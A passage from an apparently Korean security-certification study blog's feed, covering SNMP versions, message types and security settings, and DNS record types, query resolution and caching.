          &lt;li&gt;관리되어야 할 정보, 자원 =&amp;gt; 객체의 집합체&lt;/li&gt;
          &lt;li&gt;객체별 트리형식 구조&lt;/li&gt;
          &lt;li&gt;SMI (Structure Management Information)
            &lt;ul&gt;
              &lt;li&gt;객체의 구조, 형식&lt;/li&gt;
              &lt;li&gt;ASN.1 (Abstract Syntax Notation) 언어 사용
                &lt;ul&gt;
                  &lt;li&gt;Data 와 Data 속성을 설명하기 위한 공식 언어&lt;/li&gt;
                  &lt;li&gt;name (OID:Object Identifier)&lt;/li&gt;
                  &lt;li&gt;syntax (객체의 Data 유형)&lt;/li&gt;
                  &lt;li&gt;encoding (Message 전송 시 비트변환 규칙)
                    &lt;ul&gt;
                      &lt;li&gt;BER : encoding rule 중 하나&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;</content><author><name>HY03</name><email>hyunik03@gmail.com</email></author><category term="IS_Certification" /><category term="정보보안기사" /><category term="어플리케이션" /><summary type="html">SNMP (Simple Network Manage Protocol) 개요 간이 망 관리 프로토콜 TCP/IP 초창기에는 ICMP 프로토콜의 ping 을 이용해 장비간 연결 상태 파악 Host 수의 증가로 네트워크 시스템이 복잡해짐 -&amp;gt; 관리의 어려움 1988년 IAB (인터넷 표준제안 위원회) 에서 표준 작업을 시작 SGMP -&amp;gt; SNMP 네트워크 장비를 관리, 감시하기 위한 프로토콜 UDP, 응용계층 표준 프로토콜 모니터링 / 컨트롤 네트워크 관리 시스템 (NMS - Network Management System) 에서 사용 정기적으로 관리정보 수집 (SNMP Protocol) 실시간으로 네트워크 상태 모니터링, 설정 (SNMP Protocol) 대부분의 OS 에 탑재 네트워크 관리 정보를 얻기 위해서 관리 프로그램이 필요 SNMP 는 Protocol 관리 프로그램 필요 관리시스템, 관리대상 필요 SNMP 구조 관리시스템 Manager 모듈 (162/UDP) Manager 모듈이 Agent 모듈을 조회 Agent 는 Manager 에 응답 관리대상 Agent 모듈 (161/UDP) Agent 는 Manager 에 Trap 전송 MRTG (Multiple Router Traffic Grapher) SNMP 기반의 장비 모니터링 프로그램 네트워크 상에 발생하는 트래픽 사용량 모니터링 MIB 를 이용해 정보 수집 가능 MIB (Management Information Base) 관리장치에 대한 정보가 모인 데이터베이스 Agent 각각이 MIB를 가지고 있음 SNMP 동작 (PDU) Manager -&amp;gt; Agent Get Request : MIB 정보 요청 Manager &amp;lt;- Agent Get Response Manager -&amp;gt; Agent Get Next Request : 이미 요청한 정보의 다음 정보 요청 Manager &amp;lt;- Agent Get Response Manager -&amp;gt; Agent Set Request : MIB 설정 요청 Manager &amp;lt;- Agent Get Response Manager &amp;lt;- Agent Trap : Agent 가 Manager 에게 비동기적으로 알림 (Notify) SNMP 통신을 위한 3가지 조건 SNMP 버전이 일치해야 함 v1 SGMP (Simple Gateway Management Protocol) 를 발전시킴 보안기능(암호, 인증) 없음 community string 만 일치하면 모든 정보 획득가능 평문 전송 (Snipping 노출) v2 보안기능 추가 대칭키 암호화 알고리즘 (DES) 해시 알고리즘 (MD5) 송신처 인증 기능이 없음 SNMP v2c 복잡한 보안기능 제거, 보안상 취약 평문 전송 (Snipping 노출) v3 Data 인증 암호화 재사용방지 접근통제 Community String 송수신 하기 전 미리 인증을 하기 위해 사용하는 P/W PDU (Protocol Data Unit) 이 일치해야 함 통신하기 위한 메시지 유형 Get Request &amp;lt;–&amp;gt; Get Response Read 형 SNMPv1 Get Request Get Next Request SNMPv2 / v3 Get Request Get Bulk Request : 요청 객체의 범위를 지정 Write 형 SNMPv1 Set Request SNMPv2 / v3 Set Request Response 형 SNMPv1 Get Response SNMPv2 / v3 Response Trap SNMPv1 Trap SNMPv2 / v3 TrapV2 InformRequest : Manager 가 다른 Manager 에 정보를 요청할 때 사용 Report : 다른 Manager 에 보고할 때 사용 (SNMPv3 기준) Message 구조 버전 공통 Header 보안 매개변수 PDU 데이터 공통 Header 부 메시지 ID 메시지 최대크기 메시지 Flag 메시지 보안모델 메시지 보안모델 USM (User Security Model) VACM (View-based Access Control Model) 모델 보안 매개변수 부 재전송 공격 방지 메시지위변조 방지 암호 매개변수 재전송 공격방지 SNMP 엔진 IP (Authoritative 엔진 ID) 부트횟수 (Authoritative 엔진부트 횟수) 엔진 시간정보 (Authoritative 엔진 time) 메시지위변조 방지 (HMAC) - MD5 SHA 사용자 인증 매개변수 암호 매개변수 (DES-CBC) SNMP 데이터 수집 방식 Polling : Manager 가 Agent 에 요청하면 응답 Event Report : Agent 가 Manager 에 Trap Message 전송 (Notify) SNMP 취약점 DoS 공격 취약점 버퍼오버플로우 취약점 비인가접속 취약점 SNMP 보안 SNMP는 관리자 입장에서 매우 중요한 정보를 제공 SNMP에 읽기, 쓰기 권한이 있는데 쓰기 권한은 사용 자제 Set Request 제한 SNMP v3 에서 보안 서비스를 제공 community string SNMP 데몬 (manager) 와 클라이언트 (Agent) 간 데이터 송수신 전 인증 필요 인증을 위해 사용하는 패스워드 읽기모드 RO (Read Only) / 쓰기모드 RW (Read Write) MIB : 관리장치에 대한 정보가 모인 데이터베이스 관리되어야 할 정보, 자원 =&amp;gt; 객체의 집합체 객체별 트리형식 구조 SMI (Structure Management Information) 객체의 구조, 형식 ASN.1 (Abstract Syntax Notation) 언어 사용 Data 와 Data 속성을 설명하기 위한 공식 언어 name (OID:Object Identifier) syntax (객체의 Data 유형) encoding (Message 전송 시 비트변환 규칙) BER : encoding rule 중 하나</summary></entry><entry><title type="html">정보보안 - DNS(Domain Name System)</title><link href="https://bluesplatter.com/is_certification/IS-Application-DNS/" rel="alternate" type="text/html" title="정보보안 - DNS(Domain Name System)" /><published>2021-07-08T23:00:00+09:00</published><updated>2021-07-08T23:00:00+09:00</updated><id>https://bluesplatter.com/is_certification/IS-Application-DNS</id><content type="html" xml:base="https://bluesplatter.com/is_certification/IS-Application-DNS/">&lt;h1 id=&quot;dns-domain-name-system&quot;&gt;DNS (Domain Name System)&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;개요
    &lt;ul&gt;
      &lt;li&gt;DNS 는 프로토콜이라기 보다는 인터넷 네임체계를 규정하는 거대한 시스템
        &lt;ul&gt;
          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.google.com&lt;/code&gt; : 사람은 문자형태로 입력&lt;/li&gt;
          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.0.1&lt;/code&gt; : 컴퓨터가 알아볼 수 있는 형태&lt;/li&gt;
          &lt;li&gt;DNS : 사람과 컴퓨터가 알아볼 수 있는 형태로 변환해주는 체계&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;과정
    &lt;ul&gt;
      &lt;li&gt;User -&amp;gt; DNS    Client PC    WebServer
        &lt;ul&gt;
          &lt;li&gt;User : 네임 입력&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;User    DNS -&amp;gt; Client PC    WebServer
        &lt;ul&gt;
          &lt;li&gt;DNS 역할&lt;/li&gt;
          &lt;li&gt;DNS : 네임 요청처리&lt;/li&gt;
          &lt;li&gt;DNS : 주소 변환&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;User    DNS    Client PC -&amp;gt; WebServer
        &lt;ul&gt;
          &lt;li&gt;Client PC : 자원요청&lt;/li&gt;
          &lt;li&gt;WebServer : 요청처리&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;User    DNS    Client PC &amp;lt;- WebServer
        &lt;ul&gt;
          &lt;li&gt;WebServer : 응답생성&lt;/li&gt;
          &lt;li&gt;Client PC : 응답처리&lt;/li&gt;
          &lt;li&gt;User : 자원접근&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;기능
    &lt;ul&gt;
      &lt;li&gt;네임 공간 정의 (네임구조)
        &lt;ul&gt;
          &lt;li&gt;계층구조 예시 : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.google.com&lt;/code&gt; (계층구조)
            &lt;ul&gt;
              &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com&lt;/code&gt; : 최상위 도메인 (TLDs) 공간
                &lt;ul&gt;
                  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;google&lt;/code&gt; : 2단계 도메인&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;루트서버 (전 세계 13개정도가 있음)
            &lt;ul&gt;
              &lt;li&gt;도메인에 대한 정보를 가지고 있지 않음&lt;/li&gt;
              &lt;li&gt;자신의 권한을 다른 서버들에게 위임, 서버만 참조&lt;/li&gt;
              &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.com&lt;/code&gt; : TLDs
                &lt;ul&gt;
                  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.google&lt;/code&gt; : 2단계 도메인&lt;/li&gt;
                  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.naver&lt;/code&gt; : 2단계 도메인
                    &lt;ul&gt;
                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;blog&lt;/code&gt; : 하위도메인&lt;/li&gt;
                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cafe&lt;/code&gt; : 하위도메인&lt;/li&gt;
                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mail&lt;/code&gt; : 하위도메인&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.edu&lt;/code&gt; : TLDs
                &lt;ul&gt;
                  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.skku&lt;/code&gt; : 2단계 도메인&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.net&lt;/code&gt; : TLDs
                &lt;ul&gt;
                  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.daum&lt;/code&gt; : 2단계 도메인&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;DNS 서버
            &lt;ul&gt;
              &lt;li&gt;도메인을 담당하는 호스트&lt;/li&gt;
              &lt;li&gt;저장되는 데이터
                &lt;ul&gt;
                  &lt;li&gt;자원 레코드 (Resource Record, RR)
                    &lt;ul&gt;
                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.google.com = 192.168.xx.xx&lt;/code&gt;&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;마스터 파일 (Zone 파일)
                    &lt;ul&gt;
                      &lt;li&gt;도메인에 대한 정보를 가지고 있음&lt;/li&gt;
                      &lt;li&gt;RR(복수개) 들을 관리&lt;/li&gt;
                      &lt;li&gt;RR의 추가, 변경, 삭제
                        &lt;ul&gt;
                          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;music.google.com = 192.168.xx.xx&lt;/code&gt;&lt;/li&gt;
                        &lt;/ul&gt;
                      &lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;Zone : 도메인을 관리하는 단위 (영역)
            &lt;ul&gt;
              &lt;li&gt;DNS 서버(네임서버) 하나가 책임이나 권한을 가지는 영역&lt;/li&gt;
              &lt;li&gt;도메인은 위임을 통해 관리가 가능한 단위로 분할 가능&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;자원 레코드 (Resource Record, RR)
            &lt;ul&gt;
              &lt;li&gt;DNS 서버는 모든 데이터를 RR로 정의해서 저장
                &lt;ul&gt;
                  &lt;li&gt;네임 (0~32)
                    &lt;ul&gt;
                      &lt;li&gt;도메인 혹은 Zone Name&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;
                    &lt;table&gt;
                      &lt;tbody&gt;
                        &lt;tr&gt;
                          &lt;td&gt;유형(Type) (0~16)&lt;/td&gt;
                          &lt;td&gt;클래스 (16~32)&lt;/td&gt;
                        &lt;/tr&gt;
                      &lt;/tbody&gt;
                    &lt;/table&gt;
                    &lt;ul&gt;
                      &lt;li&gt;유형(Type)
                        &lt;ul&gt;
                          &lt;li&gt;
                            &lt;table&gt;
                              &lt;tbody&gt;
                                &lt;tr&gt;
                                  &lt;td&gt;유형값&lt;/td&gt;
                                  &lt;td&gt;문자코드&lt;/td&gt;
                                  &lt;td&gt;RR유형&lt;/td&gt;
                                &lt;/tr&gt;
                              &lt;/tbody&gt;
                            &lt;/table&gt;
                          &lt;/li&gt;
                          &lt;li&gt;
                            &lt;table&gt;
                              &lt;tbody&gt;
                                &lt;tr&gt;
                                  &lt;td&gt;1&lt;/td&gt;
                                  &lt;td&gt;A&lt;/td&gt;
                                  &lt;td&gt;주소 (IPv4)&lt;/td&gt;
                                &lt;/tr&gt;
                              &lt;/tbody&gt;
                            &lt;/table&gt;
                          &lt;/li&gt;
                          &lt;li&gt;
                            &lt;table&gt;
                              &lt;tbody&gt;
                                &lt;tr&gt;
                                  &lt;td&gt;28&lt;/td&gt;
                                  &lt;td&gt;AAAA&lt;/td&gt;
                                  &lt;td&gt;주소 (IPv6)&lt;/td&gt;
                                &lt;/tr&gt;
                              &lt;/tbody&gt;
                            &lt;/table&gt;
                          &lt;/li&gt;
                          &lt;li&gt;
                            &lt;table&gt;
                              &lt;tbody&gt;
                                &lt;tr&gt;
                                  &lt;td&gt;2&lt;/td&gt;
                                  &lt;td&gt;NS&lt;/td&gt;
                                  &lt;td&gt;네임서버 (이름)&lt;/td&gt;
                                &lt;/tr&gt;
                              &lt;/tbody&gt;
                            &lt;/table&gt;
                          &lt;/li&gt;
                          &lt;li&gt;
                            &lt;table&gt;
                              &lt;tbody&gt;
                                &lt;tr&gt;
                                  &lt;td&gt;5&lt;/td&gt;
                                  &lt;td&gt;CNAME&lt;/td&gt;
                                  &lt;td&gt;정규네임 (Canonical)&lt;/td&gt;
                                &lt;/tr&gt;
                              &lt;/tbody&gt;
                            &lt;/table&gt;
                          &lt;/li&gt;
                          &lt;li&gt;
                            &lt;table&gt;
                              &lt;tbody&gt;
                                &lt;tr&gt;
                                  &lt;td&gt;6&lt;/td&gt;
                                  &lt;td&gt;SoA&lt;/td&gt;
                                  &lt;td&gt;권한개시정보 (DNS Zone 정보)&lt;/td&gt;
                                &lt;/tr&gt;
                              &lt;/tbody&gt;
                            &lt;/table&gt;
                            &lt;ul&gt;
                              &lt;li&gt;모든 Zone 은 하나의 SoA 레코드를 가지고 있음&lt;/li&gt;
                            &lt;/ul&gt;
                          &lt;/li&gt;
                          &lt;li&gt;
                            &lt;table&gt;
                              &lt;tbody&gt;
                                &lt;tr&gt;
                                  &lt;td&gt;12&lt;/td&gt;
                                  &lt;td&gt;PTR&lt;/td&gt;
                                  &lt;td&gt;포인터 (다른 위치를 가리킴, 역방향 변환 이용)&lt;/td&gt;
                                &lt;/tr&gt;
                              &lt;/tbody&gt;
                            &lt;/table&gt;
                          &lt;/li&gt;
                          &lt;li&gt;
                            &lt;table&gt;
                              &lt;tbody&gt;
                                &lt;tr&gt;
                                  &lt;td&gt;15&lt;/td&gt;
                                  &lt;td&gt;MX&lt;/td&gt;
                                  &lt;td&gt;메일 교환 (도메인으로 들어오는 이메일 처리를 위한 장비 이름 명시)&lt;/td&gt;
                                &lt;/tr&gt;
                              &lt;/tbody&gt;
                            &lt;/table&gt;
                          &lt;/li&gt;
                          &lt;li&gt;
                            &lt;table&gt;
                              &lt;tbody&gt;
                                &lt;tr&gt;
                                  &lt;td&gt;16&lt;/td&gt;
                                  &lt;td&gt;TXT&lt;/td&gt;
                                  &lt;td&gt;문자열&lt;/td&gt;
                                &lt;/tr&gt;
                              &lt;/tbody&gt;
                            &lt;/table&gt;
                          &lt;/li&gt;
                        &lt;/ul&gt;
                      &lt;/li&gt;
                      &lt;li&gt;클래스
                        &lt;ul&gt;
                          &lt;li&gt;
                            &lt;table&gt;
                              &lt;tbody&gt;
                                &lt;tr&gt;
                                  &lt;td&gt;1&lt;/td&gt;
                                  &lt;td&gt;IN (Internet, 가장많이 사용)&lt;/td&gt;
                                &lt;/tr&gt;
                              &lt;/tbody&gt;
                            &lt;/table&gt;
                          &lt;/li&gt;
                          &lt;li&gt;
                            &lt;table&gt;
                              &lt;tbody&gt;
                                &lt;tr&gt;
                                  &lt;td&gt;2&lt;/td&gt;
                                  &lt;td&gt;Unassigned (할당되지 않음)&lt;/td&gt;
                                &lt;/tr&gt;
                              &lt;/tbody&gt;
                            &lt;/table&gt;
                          &lt;/li&gt;
                          &lt;li&gt;
                            &lt;table&gt;
                              &lt;tbody&gt;
                                &lt;tr&gt;
                                  &lt;td&gt;3&lt;/td&gt;
                                  &lt;td&gt;CH (Chaos)&lt;/td&gt;
                                &lt;/tr&gt;
                              &lt;/tbody&gt;
                            &lt;/table&gt;
                          &lt;/li&gt;
                          &lt;li&gt;
                            &lt;table&gt;
                              &lt;tbody&gt;
                                &lt;tr&gt;
                                  &lt;td&gt;4&lt;/td&gt;
                                  &lt;td&gt;HS (Hesiod)&lt;/td&gt;
                                &lt;/tr&gt;
                              &lt;/tbody&gt;
                            &lt;/table&gt;
                          &lt;/li&gt;
                        &lt;/ul&gt;
                      &lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;유지시간 (0~32)
                    &lt;ul&gt;
                      &lt;li&gt;레코드를 읽은 장비가 캐시에 얼마동안 정보를 유지해야 하는지 명시&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;데이터 길이 (0~32)
                    &lt;ul&gt;
                      &lt;li&gt;자원에 대한 데이터 크기&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;데이터 (0~32)
                    &lt;ul&gt;
                      &lt;li&gt;실제 데이터
                        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  이름 : www.google.com
  유형 : 1
  TTL (Time To Live) :
  Size :
  호스트 : 192.168.170.10
  ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                        &lt;/div&gt;
                      &lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;DNS 서버
            &lt;ul&gt;
              &lt;li&gt;Master&lt;/li&gt;
              &lt;li&gt;Slave&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;DNS 메시지 구조
            &lt;ul&gt;
              &lt;li&gt;사용자가 DNS 서버에 질의했을 때 받는 메시지
                &lt;ul&gt;
                  &lt;li&gt;Header (12 Bytes)
                    &lt;ul&gt;
                      &lt;li&gt;메시지 유형 설명&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;Question (가변)
                    &lt;ul&gt;
                      &lt;li&gt;질의 정보&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;Answer (가변)
                    &lt;ul&gt;
                      &lt;li&gt;질문에 대한 답변 RR&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;Authority (가변)
                    &lt;ul&gt;
                      &lt;li&gt;권한 네임서버를 가리키는 하나 이상의 RR 포함&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;Additional (가변)
                    &lt;ul&gt;
                      &lt;li&gt;질의와 관련된 부가정보를 나타내는 하나 이상의 RR&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;네임 등록
        &lt;ul&gt;
          &lt;li&gt;IP 주소 (예:192.168.0.10) 에 웹서버를 구축한 경우
            &lt;ul&gt;
              &lt;li&gt;이름 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.abc.com&lt;/code&gt; 으로 접근시키기 위해서 네임 등록&lt;/li&gt;
              &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;abc.com&lt;/code&gt; 도메인 공간 안에서는 마음대로 등록 가능
                &lt;ul&gt;
                  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cafe.abc.com&lt;/code&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;blog.abc.com&lt;/code&gt;&lt;/li&gt;
                  &lt;li&gt;…&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;네임 변환
        &lt;ul&gt;
          &lt;li&gt;사용자가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.abc.com&lt;/code&gt; 으로 접근했을 경우
            &lt;ul&gt;
              &lt;li&gt;IP 주소 192.168.0.10 으로 변환시켜줌&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;DNS 네임 변환 과정
            &lt;ul&gt;
              &lt;li&gt;DNS =&amp;gt; Client / Server 가 존재
                &lt;ul&gt;
                  &lt;li&gt;주소 =&amp;gt; 이름&lt;/li&gt;
                  &lt;li&gt;이름 =&amp;gt; 주소&lt;/li&gt;
                  &lt;li&gt;Resolver (변환기) : 네임서버에 질의를 수행하는 SW / 모듈&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;반복적 해석 (변환) : Iterative Query
                &lt;ul&gt;
                  &lt;li&gt;Authoritative 서버에 질의할 경우&lt;/li&gt;
                  &lt;li&gt;User -&amp;gt; 루트 NS    .Com 담당 NS    google 담당 NS
                    &lt;ul&gt;
                      &lt;li&gt;google.com 변환 요청&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;User &amp;lt;- 루트 NS    .Com 담당 NS    google 담당 NS
                    &lt;ul&gt;
                      &lt;li&gt;com 담당 네임서버 주소&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;User        -&amp;gt;     .Com 담당 NS    google 담당 NS
                    &lt;ul&gt;
                      &lt;li&gt;google.com 변환 요청&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;User        &amp;lt;-     .Com 담당 NS    google 담당 NS
                    &lt;ul&gt;
                      &lt;li&gt;google.com 담당 NS 주소&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;User                     -&amp;gt;         google 담당 NS
                    &lt;ul&gt;
                      &lt;li&gt;google.com 변환 요청&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;User                     &amp;lt;-         google 담당 NS
                    &lt;ul&gt;
                      &lt;li&gt;google.com IP 주소&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;재귀적 해석 (변환) : Recursive Query
                &lt;ul&gt;
                  &lt;li&gt;Recursive 서버에 질의할 경우&lt;/li&gt;
                  &lt;li&gt;중간 과정의 네임서버들이 모두 재귀적 변환을 허용해야 함
                    &lt;ul&gt;
                      &lt;li&gt;실제로는 그렇지 않음.&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;User -&amp;gt; 루트 NS    .Com 담당 NS    google 담당 NS
                    &lt;ul&gt;
                      &lt;li&gt;google.com 변환 요청&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;User    루트 NS -&amp;gt; .Com 담당 NS    google 담당 NS
                    &lt;ul&gt;
                      &lt;li&gt;google.com 변환 요청&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;User    루트 NS    .Com 담당 NS -&amp;gt; google 담당 NS
                    &lt;ul&gt;
                      &lt;li&gt;google.com 변환 요청&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;User    루트 NS    .Com 담당 NS &amp;lt;- google 담당 NS
                    &lt;ul&gt;
                      &lt;li&gt;google.com IP 주소&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;User    루트 NS &amp;lt;- .Com 담당 NS    google 담당 NS
                    &lt;ul&gt;
                      &lt;li&gt;google.com IP 주소&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;User &amp;lt;- 루트 NS    .Com 담당 NS    google 담당 NS
                    &lt;ul&gt;
                      &lt;li&gt;google.com IP 주소&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;일반적인 DNS 네임 변환 과정
                &lt;ul&gt;
                  &lt;li&gt;반복적(Iterative) 변환과 재귀적(Recursive) 변환을 함께 사용함&lt;/li&gt;
                  &lt;li&gt;DNS 서버의 종류
                    &lt;ul&gt;
                      &lt;li&gt;Recursive DNS Server : 조건이 만족될 때까지 반복적으로 처리&lt;/li&gt;
                      &lt;li&gt;Authoritative DNS Server (권한서버)
                        &lt;ul&gt;
                          &lt;li&gt;Root Server, .Com NS, google NS 등 특정 도메인 영역 (Zone) 과 권한을 가지고 있는 서버&lt;/li&gt;
                        &lt;/ul&gt;
                      &lt;/li&gt;
                      &lt;li&gt;Cache : 캐시에 저장된 정보를 제공&lt;/li&gt;
                      &lt;li&gt;ISP 업체 (KT, SKT … ) 가 제공하는 서버&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;Recursive Query 순서
                    &lt;ul&gt;
                      &lt;li&gt;
                        &lt;ol&gt;
                          &lt;li&gt;DNS Cache 검색
                            &lt;ul&gt;
                              &lt;li&gt;자신에게 도메인 정보가 없을 시 DB를 검색하거나 타 서버에 요청해야 하나 시간이 오래 걸림&lt;/li&gt;
                            &lt;/ul&gt;
                            &lt;ul&gt;
                              &lt;li&gt;캐시로 저장
                                &lt;ul&gt;
                                  &lt;li&gt;속도는 빠르나 잘못된 정보를 매핑할 수 있음&lt;/li&gt;
                                &lt;/ul&gt;
                              &lt;/li&gt;
                              &lt;li&gt;양성 캐싱(positive caching) : 한 번 질의 된 도메인 네임과 해당 IP 주소를 캐시에 유지하여 같은 질의가 올 때 캐시에서 응답해 주는 것&lt;/li&gt;
                              &lt;li&gt;음성 캐싱(negative caching) : 잘못된 도메인에 관한 요청을 캐싱하여 불필요한 트래픽과 지연을 줄이는 역할&lt;/li&gt;
                            &lt;/ul&gt;
                          &lt;/li&gt;
                        &lt;/ol&gt;
                      &lt;/li&gt;
                      &lt;li&gt;
                        &lt;ol&gt;
                          &lt;li&gt;hosts 파일 검색
                            &lt;ul&gt;
                              &lt;li&gt;host 명 : IP 주소 정보를 담고 있는 파일&lt;/li&gt;
                              &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; (리눅스) / &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hosts.ics&lt;/code&gt; (Internet Connection Sharing 기능 - 윈도우)&lt;/li&gt;
                            &lt;/ul&gt;
                            &lt;ul&gt;
                              &lt;li&gt;파밍사이트 접속유도를 위해 공격자가 목표로 하는 파일&lt;/li&gt;
                              &lt;li&gt;변조 위험성이 큼&lt;/li&gt;
                            &lt;/ul&gt;
                          &lt;/li&gt;
                        &lt;/ol&gt;
                      &lt;/li&gt;
                      &lt;li&gt;
                        &lt;ol&gt;
                          &lt;li&gt;DNS 서버 질의
                            &lt;ul&gt;
                              &lt;li&gt;Recursive DNS Server&lt;/li&gt;
                              &lt;li&gt;Authoritative DNS Server&lt;/li&gt;
                            &lt;/ul&gt;
                          &lt;/li&gt;
                        &lt;/ol&gt;
                      &lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;일반적인 과정
                    &lt;ul&gt;
                      &lt;li&gt;재귀적 질의
                        &lt;ul&gt;
                          &lt;li&gt;사용자가 브라우저에 URL 입력 : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;comps.googleex.edu&lt;/code&gt;
                            &lt;ul&gt;
                              &lt;li&gt;Resolver : 사용자 DNS 클라이언트 소프트웨어&lt;/li&gt;
                            &lt;/ul&gt;
                          &lt;/li&gt;
                          &lt;li&gt;PC 내 Resolver 가 PC 내 Cache 확인&lt;/li&gt;
